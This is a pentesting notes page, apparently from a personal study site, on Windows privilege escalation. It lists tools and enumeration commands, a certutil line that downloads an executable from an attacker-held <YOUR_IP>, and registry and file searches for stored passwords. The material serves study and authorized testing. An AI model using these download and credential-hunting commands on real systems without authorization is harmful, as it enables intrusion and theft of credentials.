---
layout: default
title: Windows Privilege Escalation
nav_order: 2
has_children: false
parent: Privilege Escalation
grand_parent: Pentesting
---

##  Windows Privilege Escalation :

Resources: 

- [Fuzzy Security Guide](https://www.fuzzysecurity.com/tutorials/16.html)
- [PayloadsAllTheThings Guide](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [Absolomb Windows Privilege Escalation Guide](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [Sushant 747's Guide](https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html)
- [TCM Guide](https://github.com/TCM-Course-Resources/Windows-Privilege-Escalation-Resources)

### Helpers 
#### Simple Web Server
```bash
sudo python3 -m http.server
```

#### Download file

```powershell
certutil -urlcache -f http://<YOUR_IP>/<YOUR_EXE> <DESTINATION>
```

#### WinPeas

Will automate the privilege escalation detection: 
- [https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)
- [https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc](  https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc)

#### TTY Shell

- [https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/full-ttys](https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/full-ttys)


### Enumeration

#### External
```bash
nmap -Pn -n -p- -A --min-rate 4000 --open -sCV <IP> -oN <FILE>.nmap
```

#### System Enumertion

```powershell
hostname

systeminfo

ipconfig

systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type" 

## LIST PATCH ON SYSTEM
wmic qe
## LIST DISK
wmic logicaldisk get caption,description,providername 
```

![](/writings/docs/assets/Pasted%20image%2020230315222528.png)
![](docs/assets/Pasted%20image%2020230315222529.png)

#### Users & Groups Enumeration


```powershell
whoami

## Display privileges
whoami /priv

## Display groups
whoami /groups

## Display user of the machine
net user

## Display information about a user
net user <USER>

##Get information about group
net localgroup administrators
```

![](/writings/docs/assets/Pasted%20image%2020230315222308.png)

![](docs/assets/Pasted%20image%2020230315222303.png)

![](/writings/docs/assets/Pasted%20image%2020230315222728.png)
![](docs/assets/Pasted%20image%2020230315222731.png)


#### Network Enumeration

```powershell
## Global network information
ipconfig

## ARP information 
arp -a

## Print routing table
route print

## Print Active connection
netstat -ano
```


#### Password Hunting

```powershell
## Search for password phrase in txt file (could be tweak to search other sensitive information)
findstr /si password *.txt
```


#### AV Enumeration

```powershell
## Search for Windows Defender
sc query windefend

## List all services
sc queryex type= service

## Show firewall state

netsh advfirewall firewall dump

netsh firewall show state

netsh firewall show config

```

#### Automated Tools 

- WinPEAS - [https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)
- Windows PrivEsc Checklist - [https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation](https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation)
- Sherlock - [https://github.com/rasta-mouse/Sherlock](https://github.com/rasta-mouse/Sherlock)
- Watson - [https://github.com/rasta-mouse/Watson](https://github.com/rasta-mouse/Watson)
- PowerUp - [https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc)
- JAWS - [https://github.com/411Hall/JAWS](https://github.com/411Hall/JAWS)
- Windows Exploit Suggester - [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- Metasploit Local Exploit Suggester - [https://blog.rapid7.com/2015/08/11/metasploit-local-exploit-suggester-do-less-get-more/](https://blog.rapid7.com/2015/08/11/metasploit-local-exploit-suggester-do-less-get-more/)
- Seatbelt - [https://github.com/GhostPack/Seatbelt](https://github.com/GhostPack/Seatbelt)
- SharpUp - [https://github.com/GhostPack/SharpUp](https://github.com/GhostPack/SharpUp)

##### Metasploit suggester: 

```bash
run post/multi/recon/local_exploit_suggester 
```

![](/writings/docs/assets/Pasted%20image%2020230316184445.png)

![](docs/assets/Pasted%20image%2020230316184446.png)


##### Windows Exploit Suggester 

- Required python2.7
- Required pip2.7
- Required `pip2 install xlrd==1.2.0` 

```bash
# Update the vulnerability DB
python2.7 ./windows-exploit-suggester.py --update

# Run the analysis on the sysinfo extracted
sudo python2.7 ./windows-exploit-suggester.py --database <2023-03-16-mssb.xls> --systeminfo <sysinfo.txt>
```

![](/writings/docs/assets/Pasted%20image%2020230316184352.png)

![](docs/assets/Pasted%20image%2020230316184354.png)



### Kernel Exploits

- [Compilation of Exploits](https://github.com/SecWiki/windows-kernel-exploits)

Search for MS10-XXX to exploit kernel. 

### Passwords and Port Forwarding

Searching in registry:

```powershell

## Search for password in registry
reg query HKLM /f password /t REG_SZ /s

## Check in detail about winlogon (usefull when password from winlogon is returned in registry)
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
```